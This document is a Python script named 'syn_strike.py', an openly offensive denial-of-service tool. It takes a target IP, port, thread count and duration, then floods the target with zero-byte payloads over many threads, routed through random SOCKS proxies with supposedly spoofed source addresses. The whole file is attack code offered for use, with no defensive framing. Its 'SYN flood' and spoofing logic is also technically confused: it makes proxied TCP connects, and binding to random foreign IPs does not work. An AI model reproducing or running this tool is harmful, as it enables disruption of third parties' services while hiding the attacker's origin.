import socks
import socket
import threading
import random
import time
from colorama import Fore
import warnings
import os

warnings.filterwarnings("ignore")

COLOR_CODE = {
    "RESET": "\033[0m",
    "CYAN": "\033[36m",
    "BLUE": "\033[34m",
}

def cyan_to_blue(text):
    start_color = (0, 255, 255)  # Cyan
    end_color = (0, 0, 255)      # Blue
    gradient = ""
    for i, char in enumerate(text):
        r = int(start_color[0] + (end_color[0] - start_color[0]) * (i / len(text)))
        g = int(start_color[1] + (end_color[1] - start_color[1]) * (i / len(text)))
        b = int(start_color[2] + (end_color[2] - start_color[2]) * (i / len(text)))
        gradient += f"\033[38;2;{r};{g};{b}m{char}"
    gradient += "\033[0m"
    return gradient

proxies = []
Intn = random.randint
Choice = random.choice

def load_proxies():
    global proxies
    try:
        with open("proxies.txt", "r") as f:
            proxies = [line.strip() for line in f if line.strip()]
        if not proxies:
            print(cyan_to_blue("> Proxy file is empty."))
            return False
        return True
    except Exception as e:
        print(cyan_to_blue(f"> Failed to load proxy file: {e}"))
        return False

def setup_socket(proxy_type, proxy):
    s = socks.socksocket()
    proxy_ip, proxy_port = proxy.split(":")
    if proxy_type == 4:
        s.set_proxy(socks.SOCKS4, proxy_ip, int(proxy_port))
    elif proxy_type == 5:
        s.set_proxy(socks.SOCKS5, proxy_ip, int(proxy_port))
    elif proxy_type == 0:
        s.set_proxy(socks.HTTP, proxy_ip, int(proxy_port))
    s.settimeout(5)
    return s

def spoof_source_ip():
    return f"{Intn(1, 255)}.{Intn(0, 255)}.{Intn(0, 255)}.{Intn(0, 255)}"

def syn_strike(event, proxy_type, target_ip, target_port):
    global proxies
    spoofed_sources = [spoof_source_ip() for _ in range(100)]
    event.wait()
    while True:
        s = None
        try:
            proxy = Choice(proxies)
            s = setup_socket(proxy_type, proxy)
            s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
            s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEPORT, 1)
            s.setsockopt(socket.IPPROTO_TCP, socket.TCP_NODELAY, 1)
            while True:
                source_ip = Choice(spoofed_sources)
                s.bind((source_ip, Intn(1024, 65535)))
                s.connect((target_ip, target_port))
                s.send(b"\x00" * 65535)
        except:
            if s:
                s.close()

def main():
    import sys
    if len(sys.argv) < 5:
        print(cyan_to_blue("> Usage: python syn_strike.py <ip> <threads> <duration> <port>"))
        sys.exit(1)
    target_ip = sys.argv[1]
    threads = int(sys.argv[2])
    duration = int(sys.argv[3])
    target_port = int(sys.argv[4])
    proxy_type = 5
    try:
        socket.inet_aton(target_ip)
    except socket.error:
        print(cyan_to_blue("> Invalid IP format. Use: <IP>"))
        sys.exit(1)
    if not load_proxies():
        sys.exit(1)
    event = threading.Event()
    print(cyan_to_blue(f"> Launching SYN-STRIKE attack on {target_ip}:{target_port} with {threads} threads for {duration} seconds..."))
    for _ in range(threads):
        th = threading.Thread(target=syn_strike, args=(event, proxy_type, target_ip, target_port))
        th.daemon = True
        th.start()
    event.set()
    time.sleep(duration)
    event.clear()
    print(cyan_to_blue("> Attack SYN-STRIKE finished."))

if __name__ == "__main__":
    main()
